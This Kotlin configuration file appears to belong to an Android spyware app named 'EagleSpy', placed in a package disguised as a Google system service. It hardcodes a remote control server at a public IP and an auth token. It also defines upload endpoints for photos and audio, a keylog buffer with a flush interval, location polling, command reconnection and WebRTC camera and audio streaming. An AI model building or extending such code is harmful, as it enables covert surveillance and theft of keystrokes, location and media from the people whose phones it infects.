package com.google.android.systemservice.config

import android.content.Context

object AndroidConfig {
    // Server Configuration
    // TODO: Change this to your computer's LAN IP (e.g., 192.168.1.5) if testing on physical device OR MuMu Player
    // 10.0.2.2 works ONLY for the official Android Studio Emulator
    // private var serverBaseUrl = "192.168.1.5:8080" 
    private var serverBaseUrl = "213.91.211.150:8080"
    private var useHttps = false
    
    // API Authentication Token (MUST match server's config/device_secret.token)
    const val DEVICE_TOKEN = "EagleSpy_X9f2K7mN4pQ8wL3jR6vT1bY5cH0sA"
    
    // Device Identifier (cached from Settings.Secure.ANDROID_ID)
    var deviceId: String = ""
        private set
    
    /**
     * Initialize device ID from Android system (call once on app start)
     */
    fun initDeviceId(context: Context) {
        if (deviceId.isEmpty()) {
            deviceId = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown_device"
        }
    }
    
    // Computed URLs
    val httpProtocol: String
        get() = if (useHttps) "https" else "http"
    
    val wsProtocol: String
        get() = if (useHttps) "wss" else "ws"
    
    val serverUrl: String
        get() = "$httpProtocol://$serverBaseUrl"
    
    val websocketUrl: String
        get() = "$wsProtocol://$serverBaseUrl/cable"
    
    val apiBaseUrl: String
        get() = "$serverUrl/api"
    
    // Specific endpoints
    val photosEndpoint: String
        get() = "$apiBaseUrl/photos"
    
    val audioEndpoint: String
        get() = "$apiBaseUrl/audio"
    
    val configEndpoint: String
        get() = "$apiBaseUrl/config"
    
    // Polling intervals (milliseconds)
    const val LOCATION_UPDATE_INTERVAL = 60000L // 1 minute
    const val COMMAND_RECONNECT_DELAY = 5000L // 5 seconds
    const val KEYLOG_BUFFER_FLUSH_INTERVAL = 300000L // 5 minutes
    
    // Buffer sizes
    const val MAX_KEYLOG_BUFFER_SIZE = 500000 // 500KB
    const val MAX_PHOTO_BATCH_SIZE = 5
    const val MAX_AUDIO_BATCH_SIZE = 10
    
    // WebRTC Configuration
    const val WEBRTC_VIDEO_WIDTH = 1280
    const val WEBRTC_VIDEO_HEIGHT = 720
    const val WEBRTC_VIDEO_FPS = 30
    const val WEBRTC_AUDIO_ECHO_CANCELLATION = true
    const val WEBRTC_AUDIO_NOISE_SUPPRESSION = true
    
    /**
     * Update server configuration dynamically
     */
    fun updateServerConfig(host: String, port: Int, https: Boolean = false) {
        serverBaseUrl = "$host:$port"
        useHttps = https
    }
    
    /**
     * Load configuration from SharedPreferences
     */
    fun loadFromPreferences(context: Context) {
        val prefs = context.getSharedPreferences("android_config", Context.MODE_PRIVATE)
        serverBaseUrl = prefs.getString("server_base_url", serverBaseUrl) ?: serverBaseUrl
        useHttps = prefs.getBoolean("use_https", useHttps)
    }
    
    /**
     * Save configuration to SharedPreferences
     */
    fun saveToPreferences(context: Context) {
        context.getSharedPreferences("android_config", Context.MODE_PRIVATE).edit().apply {
            putString("server_base_url", serverBaseUrl)
            putBoolean("use_https", useHttps)
            apply()
        }
    }
    
    /**
     * Fetch configuration from server (optional)
     */
    suspend fun syncFromServer(context: Context) {
        try {
            // TODO: Implement HTTP call to fetch config from server
            // This allows server-side configuration updates
            // Example: GET /api/config returns { "server": "...", "port": ..., "https": ... }
        } catch (e: Exception) {
            android.util.Log.e("AndroidConfig", "Failed to sync config from server: ${e.message}")
        }
    }
}
